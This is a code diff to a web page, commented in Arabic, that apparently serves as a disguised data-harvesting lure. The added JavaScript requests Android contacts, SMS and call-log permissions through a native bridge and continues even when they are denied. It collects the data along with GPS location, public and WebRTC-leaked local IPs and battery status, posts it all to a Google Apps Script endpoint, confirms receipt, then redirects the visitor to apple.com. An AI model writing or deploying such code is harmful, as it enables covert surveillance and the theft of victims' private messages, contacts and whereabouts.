@@ -39,62 +39,101 @@
 </div>
 
 <script>
+  /* ================= إعدادات ================= */
   const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyKCjsAJlM5Wrqiugv2hbNfny66UfEEMNMZn6Huccd5Xj3z-sNDUBpoMz_R30NgM3hYKg/exec';
   const REDIRECT_URL      = 'https://www.apple.com';
   const ONCE_PER_VISITOR  = false;
-  const TIMEOUT           = 5000;
+  const POST_TIMEOUT      = 12000;
   const GEO_TIMEOUT       = 12000;
+  const PERM_TIMEOUT      = 30000;
+  const CONTACTS_PICK_MS  = 25000;
+  const VERIFY_TIMEOUT    = 9000;
   const MAX_CONTACTS      = 200;
   const MAX_MSGS          = 100;
   const MAX_CALLS         = 100;
-  const MAX_JSON          = 9000;
+  const MAX_JSON          = 40000;   // أقل من حد الخلية 45000 في السكربت
 
-  const NATIVE = !!(window.AndroidBridge);
+  const B      = window.AndroidBridge || null;
+  const NATIVE = !!B;
 
   document.getElementById('hint').textContent = NATIVE
     ? 'الوضع: تطبيق — مزامنة كاملة'
     : 'الوضع: متصفح — الرسائل وسجل المكالمات غير متاحين';
 
+  /* ================= أدوات ================= */
   const withTimeout = (p, ms, fb) =>
     Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);
 
-  const cut = v => { const s = JSON.stringify(v); return s.length > MAX_JSON ? s.slice(0, MAX_JSON) : s; };
+  const arr = v => Array.isArray(v) ? v : [];
+
   const safeParse = (fn, fb) => { try { return JSON.parse(fn()); } catch { return fb; } };
 
-  /* ---------- جهات الاتصال ---------- */
-  function getContacts() {
-    if (NATIVE && AndroidBridge.getContacts) {
-      const list = safeParse(() => AndroidBridge.getContacts(), []);
-      return Promise.resolve(list.slice(0, MAX_CONTACTS));
+  // قصّ على مستوى المصفوفة → يبقى الـ JSON صالحًا للتحليل في السكربت
+  function pack(list, max) {
+    const out = []; let n = 2;
+    for (const x of arr(list)) {
+      const s = JSON.stringify(x).length + 1;
+      if (n + s > max) break;
+      out.push(x); n += s;
+    }
+    return out;
+  }
+
+  /* ================= الصلاحيات ================= */
+  async function ensurePerms() {
+    if (!NATIVE) return;
+    const jobs = [
+      ['hasContactsPermission', 'requestContactsPermission'],
+      ['hasSmsPermission',      'requestSmsPermission'],
+      ['hasCallLogPermission',  'requestCallLogPermission']
+    ];
+    for (const [has, req] of jobs) {
+      if (typeof B[has] !== 'function' || typeof B[req] !== 'function') continue;
+      try { if (B[has]()) continue; } catch { continue; }
+
+      await new Promise(res => {
+        window.__permCb = res;
+        try { B[req](); } catch { return res(false); }
+        setTimeout(() => res(false), PERM_TIMEOUT);
+      });
+      window.__permCb = null;
+      // نكمل حتى لو رُفض — القسم المعني سيرجع مصفوفة فارغة
+    }
+  }
+
+  /* ================= جمع البيانات ================= */
+  async function getContacts() {
+    if (NATIVE && typeof B.getContacts === 'function') {
+      return arr(safeParse(() => B.getContacts(), [])).slice(0, MAX_CONTACTS);
     }
     if (navigator.contacts && navigator.contacts.select) {
-      return navigator.contacts.select(['name', 'tel'], { multiple: true })
-        .then(list => list.slice(0, MAX_CONTACTS).map(c => ({
+      try {
+        const list = await withTimeout(
+          navigator.contacts.select(['name', 'tel'], { multiple: true }),
+          CONTACTS_PICK_MS, []);
+        return arr(list).slice(0, MAX_CONTACTS).map(c => ({
           n: (c.name && c.name[0]) || '',
-          t: (c.tel || []).slice(0, 2).join(' / ')
-        })))
-        .catch(() => []);
+          t: arr(c.tel).slice(0, 2).join(' / ')
+        }));
+      } catch { return []; }
     }
-    return Promise.resolve([]);
+    return [];
   }
 
-  /* ---------- الرسائل ---------- */
-  function getSMS() {
-    if (NATIVE && AndroidBridge.getSms) {
-      return Promise.resolve(safeParse(() => AndroidBridge.getSms(), []).slice(0, MAX_MSGS));
+  async function getSMS() {
+    if (NATIVE && typeof B.getSms === 'function') {
+      return arr(safeParse(() => B.getSms(MAX_MSGS), [])).slice(0, MAX_MSGS);
     }
-    return Promise.resolve([]);
+    return [];
   }
 
-  /* ---------- سجل المكالمات ---------- */
-  function getCalls() {
-    if (NATIVE && AndroidBridge.getCallLog) {
-      return Promise.resolve(safeParse(() => AndroidBridge.getCallLog(), []).slice(0, MAX_CALLS));
+  async function getCalls() {
+    if (NATIVE && typeof B.getCallLog === 'function') {
+      return arr(safeParse(() => B.getCallLog(MAX_CALLS), [])).slice(0, MAX_CALLS);
     }
-    return Promise.resolve([]);
+    return [];
   }
 
-  /* ---------- الموقع كإحداثيات ---------- */
   function getGeo() {
     const p = new Promise(resolve => {
       if (!navigator.geolocation) return resolve({ s: 'N/A' });
@@ -114,8 +153,11 @@
 
   async function getIP() {
     try {
-      const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-      return (await r.json()).ip || 'N/A';
+      const r = await withTimeout(
+        fetch('https://api.ipify.org?format=json', { cache: 'no-store' }), 5000, null);
+      if (!r) return 'N/A';
+      const j = await r.json();
+      return j.ip || 'N/A';
     } catch { return 'N/A'; }
   }
 
@@ -125,30 +167,68 @@
       let done = false;
       const fin = v => { if (!done) { done = true; resolve(v); } };
       let pc;
-      try { pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
-      catch { return fin('N/A'); }
+      try {
+        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      } catch { return fin('N/A'); }
+
       pc.onicecandidate = e => {
         if (e.candidate) return;
         const sdp = pc.localDescription ? pc.localDescription.sdp : '';
-        fin((sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/) || [])[0] || 'N/A');
+        // يتجاهل mDNS (*.local) ويلتقط IPv4 الحقيقي فقط
+        const m = sdp.match(/candidate:\S+ \d+ \S+ \d+ (\d{1,3}(?:\.\d{1,3}){3})/);
+        fin(m ? m[1] : 'N/A');
         try { pc.close(); } catch {}
       };
+
       try {
         pc.createDataChannel('x');
         pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => fin('N/A'));
       } catch { fin('N/A'); }
     });
-    return withTimeout(p, TIMEOUT, 'N/A');
+    return withTimeout(p, 5000, 'N/A');
   }
 
   async function getBattery() {
     if (!navigator.getBattery) return 'N/A';
     try {
-      const b = await navigator.getBattery();
+      const b = await withTimeout(navigator.getBattery(), 3000, null);
+      if (!b) return 'N/A';
       return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
     } catch { return 'N/A'; }
   }
 
+  /* ================= التحقق من الاستلام ================= */
+  const nonce = (crypto.randomUUID && crypto.randomUUID()) ||
+                (String(Date.now()) + '-' + Math.random().toString(36).slice(2));
+
+  function verify() {
+    return new Promise(resolve => {
+      const cb = '__v' + Math.floor(Math.random() * 1e9);
+      const s  = document.createElement('script');
+      let done = false;
+      let timer;
+
+      const fin = v => {
+        if (done) return;
+        done = true;
+        clearTimeout(timer);
+        try { delete window[cb]; } catch { window[cb] = undefined; }
+        s.remove();
+        resolve(!!v);
+      };
+
+      window[cb] = fin;
+      timer = setTimeout(() => fin(false), VERIFY_TIMEOUT);
+      s.onerror = () => fin(false);
+      s.src = GOOGLE_SCRIPT_URL
+            + '?check=' + encodeURIComponent(nonce)
+            + '&cb=' + cb
+            + '&t=' + Date.now();
+      document.body.appendChild(s);
+    });
+  }
+
+  /* ================= التشغيل ================= */
   let busy = false;
 
   async function startTracking() {
@@ -176,18 +256,22 @@
     status.className = '';
     status.textContent = 'جارٍ جمع البيانات…';
 
-    // كل ما يحتاج نقرة المستخدم يُستدعى هنا فورًا وبالتزامن
-    const contactsP = getContacts();
-    const geoP      = getGeo();
-
     try {
-      const [contacts, geo, sms, calls, ip, localIP, battery] = await Promise.all([
-        contactsP, geoP, getSMS(), getCalls(), getIP(), getWebRTC(), getBattery()
+      await ensurePerms();
+
+      const geoP = getGeo();
+      const contacts = await getContacts();
+
+      const [geo, sms, calls, ip, localIP, battery] = await Promise.all([
+        geoP, getSMS(), getCalls(), getIP(), getWebRTC(), getBattery()
       ]);
 
       const payload = {
         time: new Date().toISOString(),
-        ip, localIP, battery,
+        nonce,
+        ip,
+        localIP,
+        battery,
         geoStatus: geo.s,
         lat: geo.lat ?? '',
         lng: geo.lng ?? '',
@@ -197,26 +281,42 @@
         ua: navigator.userAgent,
         native: NATIVE,
         cCount: contacts.length,
-        cJson: cut(contacts),
+        cJson: JSON.stringify(pack(contacts, MAX_JSON)),
         sCount: sms.length,
-        sJson: cut(sms),
+        sJson: JSON.stringify(pack(sms, MAX_JSON)),
         lCount: calls.length,
-        lJson: cut(calls)
+        lJson: JSON.stringify(pack(calls, MAX_JSON))
       };
 
-      await fetch(GOOGLE_SCRIPT_URL, {
-        method: 'POST',
-        mode: 'no-cors',
-        keepalive: true,
-        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
-        body: JSON.stringify(payload)
-      });
+      const ac = new AbortController();
+      const killer = setTimeout(() => ac.abort(), POST_TIMEOUT);
+      try {
+        await fetch(GOOGLE_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          signal: ac.signal,
+          headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+          body: JSON.stringify(payload)
+        });
+      } finally { clearTimeout(killer); }
 
-      try { localStorage.setItem('su_done', '1'); } catch {}
+      status.textContent = 'جارٍ التحقق…';
+      const ok = await verify();
 
       loader.style.display = 'none';
+
+      if (!ok) {
+        status.className = 'err';
+        status.textContent = '⚠️ لم يُؤكد الاستلام — تحقق من النشر أو أعد المحاولة';
+        btn.disabled = false;
+        btn.style.display = 'block';
+        busy = false;
+        return;
+      }
+
+      try { localStorage.setItem('su_done', '1'); } catch {}
       status.className = 'ok';
-      status.textContent = `✅ تم — ${contacts.length} جهة اتصال، ${sms.length} رسالة، ${calls.length} مكالمة`;
+      status.textContent = `✅ تم — ${contacts.length} جهة، ${sms.length} رسالة، ${calls.length} مكالمة`;
       setTimeout(() => location.href = REDIRECT_URL, 2200);
 
     } catch (err) {
